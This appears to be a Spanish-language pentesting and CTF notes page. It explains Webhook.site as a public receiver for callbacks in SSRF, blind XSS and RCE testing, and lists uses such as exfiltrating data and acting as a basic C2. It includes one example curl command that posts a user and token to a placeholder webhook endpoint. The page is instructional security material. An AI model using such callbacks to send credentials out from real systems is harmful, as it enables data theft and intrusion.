---
icon: webhook
---

# Webhooks para recepción de datos sin exponer tu red

### \[+] ¿Qué problema resuelve?

En auditorías de seguridad, pentesting o CTFs es común necesitar **recibir datos desde un servidor remoto**, por ejemplo:

* Exfiltración de información
* Pruebas de SSRF
* Callbacks en XSS
* Validación de RCE
* Recepción de peticiones HTTP/DNS
* Captura de credenciales o tokens

Normalmente esto implicaría:

* Abrir puertos en el router
* Configurar NAT / port forwarding
* Exponer un servidor propio a Internet

Esto **no siempre es posible ni seguro**.

***

### \[+] ¿Qué es Webhook.site?

**Webhook.site** es un servicio público que proporciona **endpoints HTTP temporales** accesibles desde Internet, permitiendo **recibir y visualizar peticiones entrantes en tiempo real**, sin necesidad de infraestructura propia.

URL = [Page webhook.site](https://webhook.site/)

Cada usuario obtiene una **URL única** que actúa como receptor de peticiones HTTP/HTTPS.

***

### \[+] Funcionamiento básico

1. Se genera una URL pública única (endpoint).
2. Cualquier sistema externo puede enviar peticiones HTTP a esa URL.
3. Las peticiones recibidas se muestran en una interfaz web:
   * Método (GET, POST, etc.)
   * Headers
   * Body
   * Parámetros
   * IP de origen

No es necesario:

* Abrir puertos
* Tener IP pública
* Configurar servidores locales

***

### \[+] Casos de uso en seguridad ofensiva

#### 🔹 Pentesting

* Recepción de callbacks en pruebas de **SSRF**
* Confirmación de **blind XSS**
* Captura de peticiones generadas por payloads remotos

#### 🔹 Auditorías

* Verificación de integraciones web
* Pruebas de webhooks mal validados
* Análisis de headers enviados por aplicaciones

#### 🔹 CTFs

* Exfiltrar flags vía HTTP
* Confirmar ejecución remota de comandos
* Simular servidores de control (C2 básico)

***

### \[+] Ejemplo de uso

Payload que envía datos a un endpoint público:

`curl -X POST https://webhook.site/<ID> \ -d "user=admin&token=12345"`

Resultado:

* La petición aparece reflejada en la interfaz
* Se pueden analizar los datos recibidos

***

### \[+] Consideraciones de seguridad

* El endpoint es **público**
* No debe usarse para datos sensibles reales
* Las URLs pueden expirar
* El servicio es de terceros (no control total)

En auditorías reales, se recomienda usarlo **solo en entornos controlados o de laboratorio**.

***

### \[+] Alternativas similares

* RequestBin
* Beeceptor
* Pipedream
* Burp Collaborator (más profesional)
* Interact.sh

## Ejemplo de funcionamiento

{% content-ref url="../../ctf/ctfs/challenge-webhooks-easy.md" %}
[challenge-webhooks-easy.md](../../ctf/ctfs/challenge-webhooks-easy.md)
{% endcontent-ref %}
